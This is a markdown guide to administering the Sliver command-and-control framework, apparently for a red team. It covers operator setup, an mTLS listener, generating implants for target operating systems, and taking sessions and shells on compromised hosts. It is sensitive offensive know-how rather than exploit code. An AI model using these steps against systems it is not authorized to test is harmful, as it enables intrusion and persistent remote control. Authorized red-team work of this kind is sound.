# 1. Administrating Sliver

1. Connect to the server on the host that is installed:
```bash
sliver
```
2. Enable Multiplayer mode, so that other users can connect to the sliver server
```bash
multiplayer
```
3. Create new operators (do this for each team member):
```bash
multiplayer
new-operator --name <operator_name> --lhost <sliver_server_ip>
```

This will generate:
- A config file for the operator that will need to be passed to other operators
- Certificates for authentication

# 2. Create a Listener

This is the listener that will catch the payload from our implant and give us the persistent access. We will create an `mtls` listener. You can also create an `http`, `https`, and `dns`.
```bash
mtls
```

# 3. Generating Implants

To create a implant, use the generate command:
```bash
generate --mtls --ip <SLIVER_IP> --os <Target_OS>
```
    --mtls: Specifies mutual TLS encryption.
    --ip: The IP address of your Sliver server.
    --os: Target operating system (e.g., windows, linux, macos).
    --save: OPTIONAL - You can use the save option to save to an specific path in your vm (e.g, /home/ubuntu).
    
It will give usually save the payload on your `/home/ubuntu` under a random name. It might look like this "RANDOM_NAME"

# 4. Interact with the Target

Once the implant is delivered and executed on the target, youâ€™ll see the session appear in the Sliver client interface. Interact with the target by selecting the session:
This command will display all sessions:
```bash
sessions
```
You can interact with an specific sessions with:
```
use <session_id>
```

# 5. Execute Commands

Use Sliver commands to execute tasks on the compromised system:

help    # View available commands
shell   # Open a shell on the target system

# 6. Operator Configuration

> [!NOTE]  
> You will need to obtain the configuration file from the sliver server admin

Operators need to:
1. Install the Sliver client on their machine:
    1. Download the latest sliver client binary for their linux host https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux .
    2. Copy the binary into `/usr/local/bin` so that you can just type `sliver` from the cli and it will connect you. 
    ```bash
    cp <PATH_OF_DOWNLOADED_SLIVER_CLIENT_FILE> /usr/local/bin
    ```
3. Copy their configuration file to `~/.sliver/configs/`
    1. If the `~/.sliver/configs` folder doesn't exist. Create it.
5. Connect to the server using:
```bash
sliver
```
You should be able to connect to the sliver server now as your operator.

# 7. Common Commands

List all operators
```bash
operators
```
Remove an operator
```bash
remove-operator <operator_name>
```
List active sessions
```bash
sessions
```

Switch between sessions
```bash
use <session_id>
```

## Troubleshooting

1. If the service fails to start:
   - Check logs: `journalctl -u sliver.service`
   - Verify permissions on config directory
   - Ensure required ports are open

2. Connection issues:
   - Verify operator config is correctly placed
   - Check firewall rules
   - Ensure certificates are valid
